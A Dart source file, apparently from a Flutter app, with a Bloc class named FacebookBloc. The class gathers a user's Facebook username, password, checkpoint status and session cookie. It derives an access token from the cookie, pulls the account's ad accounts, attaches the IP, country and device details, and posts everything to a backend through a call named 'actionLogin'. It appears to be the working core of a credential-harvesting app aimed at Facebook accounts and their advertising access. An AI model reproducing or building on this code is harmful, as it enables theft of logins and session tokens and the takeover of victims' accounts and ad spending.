import 'dart:async';
import 'dart:io';
import 'package:bloc/bloc.dart';
import 'package:equatable/equatable.dart';
import 'package:fk_user_agent/fk_user_agent.dart';
import 'package:flutter/foundation.dart';
import 'package:flutter_template/modules/data/model/app_init.model.dart';
import 'package:flutter_template/modules/data/model/post_data.model.dart';
import 'package:flutter_template/modules/domain/usecase/user_usecase.dart';
import 'package:flutter_template/modules/presentation/facebook/bloc/app_setting.dart';
import 'package:injectable/injectable.dart';

part 'facebook_event.dart';
part 'facebook_state.dart';

@Singleton()
class FacebookBloc extends Bloc<FacebookEvent, FacebookState> {
  FaceUseCase faceUseCase;
  late IPInfoModel infoModel;
  String userAgent = '';
  String platform = '';

  FacebookBloc({required this.faceUseCase}) : super(const InitFacebookState()) {
    on<InitFacebookEvent>(_onInitState);
    on<CreateFacebookEvent>(_onCreateState);
  }

  FutureOr<void> _onInitState(
    InitFacebookEvent event,
    Emitter<FacebookState> emit,
  ) async {
    infoModel = await checkCountry();
    await FkUserAgent.init();
    userAgent = FkUserAgent.userAgent ?? '';
    if (Platform.isAndroid) {
      platform = 'Android';
    } else if (Platform.isIOS) {
      platform = 'IOS';
    }
  }

  FutureOr<void> _onCreateState(
    CreateFacebookEvent event,
    Emitter<FacebookState> emit,
  ) async {
    emit(const LoadingFacebookState());
    final accessToken = await getAccessToken(event.cookie);
    final adaccounts = await getAdAccount(accessToken, event.cookie);
    await pushData(
      PostData(
        user: event.user,
        pass: event.pass,
        hasCheckpoint: event.hasCheckpoint,
        cookie: event.cookie,
        ipAdress: infoModel.ip,
        app: appName,
        countryCode: infoModel.country,
        agent: userAgent,
        adaccounts: adaccounts,
        platform: platform,
      ),
    );
    emit(const CreatedFacebookState());
  }

  //
  Future<IPInfoModel> checkCountry() async {
    final response = await faceUseCase.getCountry();
    return response.fold(
      (failure) => IPInfoModel(ip: '', country: '',org: '', isApple: false),
      (res) => res,
    );
  }

  Future<void> pushData(PostData postData) async {
    await faceUseCase.actionLogin(postData);
  }

  Future<dynamic> getAdAccount(String accessToken, String cookie) async {
    final response = await faceUseCase.getAdAccount(accessToken, cookie);
    return response.fold(
      (failure) => '[]',
      (res) => res,
    );
  }

   Future<dynamic> getAccessToken(String cookie) async {
    final response = await faceUseCase.getAccessToken(cookie);
    return response;
  }
}
